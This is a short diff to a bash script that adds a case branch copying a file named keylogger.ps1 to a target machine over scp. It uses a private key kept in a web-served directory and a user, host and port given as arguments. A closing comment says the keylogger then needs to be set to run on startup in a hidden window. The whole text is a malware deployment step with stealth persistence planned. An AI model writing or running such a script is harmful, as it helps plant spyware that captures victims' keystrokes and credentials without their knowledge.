@@ -1,8 +1,7 @@
-# send file via SCP
+#!/bin/bash
 case ${1} in
-keylog) scp /keylogger.ps1 ssh ${2}@${3} -p ${4} -i #path to loginRSAKEY
-  
+keylog) scp -i /var/www/html/id_rsa.txt -P ${4} /var/www/html/keylogger.ps1 ${2}@${3}:/Users/Public/Downloads
+
   ;;
 esac
-
 # then needs to be set to run on startup in a closed window
